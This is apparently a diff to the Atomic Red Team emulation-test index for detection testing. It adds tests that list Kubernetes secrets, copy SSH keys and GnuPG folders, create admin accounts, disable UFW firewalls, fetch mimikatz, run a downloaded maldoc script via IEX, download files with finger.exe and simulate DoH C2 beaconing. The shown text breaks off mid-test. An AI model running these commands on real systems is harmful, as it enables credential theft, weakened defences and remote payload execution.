@@ -558,10 +558,17 @@ credential-access:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get secrets -n #{namespace}
 
 '
@@ -2338,6 +2345,18 @@ credential-access:
         there is no output\n"
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
       executor:
         command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -4969,9 +4988,9 @@ credential-access:
           type: path
           default: "/tmp/keyfile_locations.txt"
       executor:
-        command: |
-          find #{search_path} -name id_rsa >> #{output_file}
-          find #{search_path} -name id_dsa >> #{output_file}
+        command: 'find #{search_path} -name id_rsa >> #{output_file}
+
+'
         cleanup_command: 'rm #{output_file}
 
 '
@@ -4997,7 +5016,6 @@ credential-access:
         command: |
           mkdir #{output_folder}
           find #{search_path} -name id_rsa -exec cp --parents {} #{output_folder} \;
-          find #{search_path} -name id_dsa -exec cp --parents {} #{output_folder} \;
         cleanup_command: 'rm #{output_folder}
 
 '
@@ -5024,7 +5042,32 @@ credential-access:
         command: |
           mkdir #{output_folder}
           find #{search_path} -name id_rsa -exec rsync -R {} #{output_folder} \;
-          find #{search_path} -name id_dsa -exec rsync -R {} #{output_folder} \;
+        cleanup_command: 'rm -rf #{output_folder}
+
+'
+        name: sh
+    - name: Copy the users GnuPG directory with rsync
+      auto_generated_guid: 2a5a0601-f5fb-4e2e-aa09-73282ae6afca
+      description: 'Copy the users GnuPG (.gnupg) directory on a Mac or Linux system
+        to a staging folder using the `rsync` command.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        search_path:
+          description: Path where to start searching from
+          type: path
+          default: "/"
+        output_folder:
+          description: Output folder containing a copy of the .gnupg directory
+          type: path
+          default: "/tmp/GnuPG"
+      executor:
+        command: |
+          mkdir #{output_folder}
+          find #{search_path} -type d -name '.gnupg' -exec rsync -Rr {} #{output_folder} \;
         cleanup_command: 'rm -rf #{output_folder}
 
 '
@@ -11016,10 +11059,17 @@ privilege-escalation:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -11042,10 +11092,17 @@ privilege-escalation:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -11567,7 +11624,7 @@ privilege-escalation:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -13469,7 +13526,7 @@ privilege-escalation:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -13725,7 +13782,7 @@ privilege-escalation:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -15871,7 +15928,7 @@ privilege-escalation:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -16349,7 +16406,7 @@ privilege-escalation:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -21792,7 +21849,7 @@ defense-evasion:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -21983,6 +22040,152 @@ defense-evasion:
           del %temp%\T1140_calc2.txt >nul 2>&1
           del %temp%\T1140_calc2_decoded.exe >nul 2>&1
         name: command_prompt
+    - name: Base64 decoding with Python
+      auto_generated_guid: 356dc0e8-684f-4428-bb94-9313998ad608
+      description: 'Use Python to decode a base64-encoded text string and echo it
+        to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'Python must be present
+
+'
+        prereq_command: 'which python3
+
+'
+        get_prereq_command: 'echo "Please install Python 3"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("#{message}".encode());print(enc.decode())')
+          python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
+          echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
+          echo $ENCODED > #{encoded_file} && python3 -c "import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"
+    - name: Base64 decoding with Perl
+      auto_generated_guid: 6604d964-b9f6-4d4b-8ce8-499829a14d0a
+      description: 'Use Perl to decode a base64-encoded text string and echo it to
+        the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'Perl must be present
+
+'
+        prereq_command: 'which perl
+
+'
+        get_prereq_command: 'echo "Please install Perl"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('#{message}'));")
+          perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
+          echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
+          echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,"<","#{encoded_file}");print(decode_base64(<$f>));'
+    - name: Base64 decoding with shell utilities
+      auto_generated_guid: b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e
+      description: 'Use common shell utilities to decode a base64-encoded text string
+        and echo it to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(echo '#{message}' | base64)
+          printf $ENCODED | base64 -d
+          echo $ENCODED | base64 -d
+          echo $(echo $ENCODED) | base64 -d
+          echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
+          echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
+          echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
+          echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
+          bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
+    - name: Hex decoding with shell utilities
+      auto_generated_guid: '005943f9-8dd5-4349-8b46-0313c0a9f973'
+      description: 'Use common shell utilities to decode a hex-encoded text string
+        and echo it to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'xxd must be present
+
+'
+        prereq_command: 'which xxd
+
+'
+        get_prereq_command: 'echo "Please install xxd"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(echo '#{message}' | xxd -ps -c 256)
+          printf $ENCODED | xxd -r -p
+          echo $ENCODED | xxd -r -p
+          echo $(echo $ENCODED) | xxd -r -p
+          echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}
+          echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}
+          echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p
+          echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
   T1610:
     technique:
       external_references:
@@ -22506,29 +22709,6 @@ defense-evasion:
       - Windows
       identifier: T1562.004
     atomic_tests:
-    - name: Disable firewall
-      auto_generated_guid: 80f5e701-f7a4-4d06-b140-26c8efd1b6b4
-      description: 'Disables the firewall
-
-'
-      supported_platforms:
-      - linux
-      input_arguments:
-        flavor_command:
-          description: Command to disable firewall. Default firewalld. ufw (Ubuntu)
-            command = ufw disable
-          type: String
-          default: systemctl stop firewalld ; systemctl disable firewalld
-        cleanup_command:
-          description: Command to enable firewall. Default firewalld. ufw (Ubuntu)
-            command = ufw enable
-          type: String
-          default: systemctl enable firewalld ; systemctl start firewalld
-      executor:
-        command: "#{flavor_command}\n"
-        cleanup_command: "#{cleanup_command}\n"
-        name: sh
-        elevation_required: true
     - name: Disable Microsoft Defender Firewall
       auto_generated_guid: 88d05800-a5e4-407e-9b53-ece4174f197f
       description: |
@@ -22629,6 +22809,249 @@ defense-evasion:
           Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
         name: powershell
         elevation_required: true
+    - name: Stop/Start UFW firewall
+      auto_generated_guid: fe135572-edcd-49a2-afe6-1d39521c5a9a
+      description: 'Stop the Uncomplicated Firewall (UFW) if installed.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'ufw disable
+
+'
+        cleanup_command: |
+          ufw enable
+          ufw status verbose
+    - name: Stop/Start UFW firewall systemctl
+      auto_generated_guid: 9fd99609-1854-4f3c-b47b-97d9a5972bd1
+      description: "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl.
+        \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemctl and ufw is installed on the machine.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n*****
+          systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v
+          ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1;
+          fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n*****
+          ufw inactive *****\\n\"; exit 1; fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'systemctl stop ufw
+
+'
+        cleanup_command: |
+          systemctl start ufw
+          systemctl status ufw
+    - name: Turn off UFW logging
+      auto_generated_guid: 8a95b832-2c2a-494d-9cb0-dc9dd97c8bad
+      description: "Turn off the Uncomplicated Firewall (UFW) logging. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine and enabled.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'ufw logging off
+
+'
+        cleanup_command: |
+          ufw logging low
+          ufw status verbose
+    - name: Add and delete UFW firewall rules
+      auto_generated_guid: b2563a4e-c4b8-429c-8d47-d5bcb227ba7a
+      description: "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed
+        and enabled. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine and enabled.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          ufw prepend deny from 1.2.3.4
+          ufw status numbered
+        cleanup_command: |
+          { echo y; echo response; } | ufw delete 1
+          ufw status numbered
+    - name: Edit UFW firewall user.rules file
+      auto_generated_guid: beaf815a-c883-4194-97e9-fdbbb2bbdd7c
+      description: 'Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/user.rules exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/user.rules" ]; then echo -e "\n*****
+          ufw NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules
+          grep "# THIS IS A COMMENT" /etc/ufw/user.rules
+        cleanup_command: 'sed -i ''s/# THIS IS A COMMENT//g'' /etc/ufw/user.rules
+
+'
+    - name: Edit UFW firewall ufw.conf file
+      auto_generated_guid: c1d8c4eb-88da-4927-ae97-c7c25893803b
+      description: "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf
+        \nwhich controls if the firewall starts on boot and its logging level.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/ufw.conf exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/ufw.conf" ]; then echo -e "\n***** ufw
+          NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf
+          grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
+        cleanup_command: |
+          sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf
+          cat /etc/ufw/ufw.conf
+    - name: Edit UFW firewall sysctl.conf file
+      auto_generated_guid: c4ae0701-88d3-4cd8-8bce-4801ed9f97e4
+      description: "Edit the Uncomplicated Firewall (UFW) configuration file for setting
+        network \nvariables /etc/ufw/sysctl.conf.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/sysctl.conf exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/sysctl.conf" ]; then echo -e "\n*****
+          ufw NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf
+          grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+        cleanup_command: |
+          sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf
+          cat /etc/ufw/sysctl.conf
+    - name: Edit UFW firewall main configuration file
+      auto_generated_guid: 7b697ece-8270-46b5-bbc7-6b9e27081831
+      description: "Edit the Uncomplicated Firewall (UFW) main configuration file
+        for setting \ndefault policies /etc/default/ufw.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/default/ufw exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/default/ufw" ]; then echo -e "\n***** ufw
+          NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/default/ufw
+          grep "# THIS IS A COMMENT" /etc/default/ufw
+        cleanup_command: 'sed -i ''s/# THIS IS A COMMENT//g'' /etc/default/ufw
+
+'
+    - name: Tail the UFW firewall log file
+      auto_generated_guid: 419cca0c-fa52-4572-b0d7-bc7c6f388a27
+      description: "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log
+        file \n/var/log/ufw.log.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /var/log/ufw.log exists.
+
+'
+        prereq_command: 'if [ ! -f "/var/log/ufw.log" ]; then echo -e "\n***** ufw
+          NOT logging *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'tail /var/log/ufw.log
+
+'
+        cleanup_command: ''
   T1562.001:
     technique:
       external_references:
@@ -27342,7 +27765,7 @@ defense-evasion:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -30005,7 +30428,7 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -39319,10 +39742,17 @@ persistence:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -39345,10 +39775,17 @@ persistence:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -39872,7 +40309,7 @@ persistence:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -41530,7 +41967,7 @@ persistence:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -41978,7 +42415,7 @@ persistence:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -44074,7 +44511,7 @@ persistence:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -44702,7 +45139,7 @@ persistence:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -58059,10 +58496,17 @@ execution:
           description: Command to run
           type: String
           default: uname
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: |
           kubectl create -f src/busybox.yaml -n #{namespace}
           kubectl exec -n #{namespace} busybox -- #{command}
@@ -58145,10 +58589,17 @@ execution:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl get cronjobs -n #{namespace}
 
 '
@@ -58171,10 +58622,17 @@ execution:
           description: K8s namespace to list
           type: String
           default: default
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: 'kubectl create -f src/cronjob.yaml -n #{namespace}
 
 '
@@ -59366,6 +59824,89 @@ execution:
         cleanup_command: 'Remove-Item #{pua_file}
 
 '
+    - name: Office Generic Payload Download
+      auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+      description: |
+        This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
+        Required input agruments are c2_domain and file_name
+        Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
+        Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
+      supported_platforms:
+      - windows
+      input_arguments:
+        macro_path:
+          description: 'Location of file which will be converted to a VBA macro
+
+'
+          type: Path
+          default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
+        c2_domain:
+          description: 'This required variable points to a user defined HTTP server
+            that will host the file_name in the c2_parent_directory.
+
+'
+          type: url
+          default: "$false"
+        c2_parent_directory:
+          description: |
+            Parent directory where you have the "malicious" file on c2_domain server.
+            Will default to root directory. Forward slashes are not needed at begining or ending of directory path
+          type: Path
+          default: ''
+        file_name:
+          description: |
+            "Malicious" file to be downloaded.
+            This required file needs to be place on the user provided c2 domain
+            Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
+          type: String
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+        ms_product:
+          description: 'Maldoc application Word or Excel
+
+'
+          type: String
+          default: Word
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Destination c2_domain name or IP address must be set to a running
+          HTTP server.
+
+'
+        prereq_command: 'if (#{c2_domain}) (exit 0) else (exit 1)
+
+'
+        get_prereq_command: 'Write-Host "Destination c2 server domain name or IP address
+          must be set and reachable for HTTP service"
+
+'
+      - description: 'Microsoftt #{ms_product} must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
+
+'
+      executor:
+        name: powershell
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macroCode = Get-Content "#{macro_path}" -Raw
+          $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
+          $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
+          Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
+        cleanup_command: 'Remove-Item "C:\Users\$env:username\Desktop\#{file_name}"
+          -ErrorAction Ignore
+
+'
   T1204.003:
     technique:
       external_references:
@@ -60544,7 +61085,7 @@ execution:
           "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
 
 '
-        cleanup_command: 'SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password}
+        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
           /TN "Atomic task" /F >nul 2>&1
 
 '
@@ -62454,7 +62995,7 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -65347,6 +65888,25 @@ command-and-control:
         command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
           | Out-File #{output_file}; Invoke-Item #{output_file}\n"
         name: powershell
+    - name: File download with finger.exe on Windows
+      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+      description: |
+        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+        Because this is being tested on the localhost, you should not be expecting a successful connection
+        https://www.exploit-db.com/exploits/48815
+        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+      executor:
+        name: command_prompt
+        command: 'finger base64_filedata@#{remote_host}
+
+'
   T1090.001:
     technique:
       external_references:
@@ -66198,7 +66758,118 @@ command-and-control:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1572
+    atomic_tests:
+    - name: DNS over HTTPS Large Query Volume
+      auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
+      description: |
+        This test simulates an infected host sending a large volume of DoH queries to a command and control server.
+        The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_volume:
+          description: Number of DNS queries to send
+          type: integer
+          default: '1000'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
+          -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content
+          }
+
+'
+        name: powershell
+    - name: DNS over HTTPS Regular Beaconing
+      auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
+      description: |
+        This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
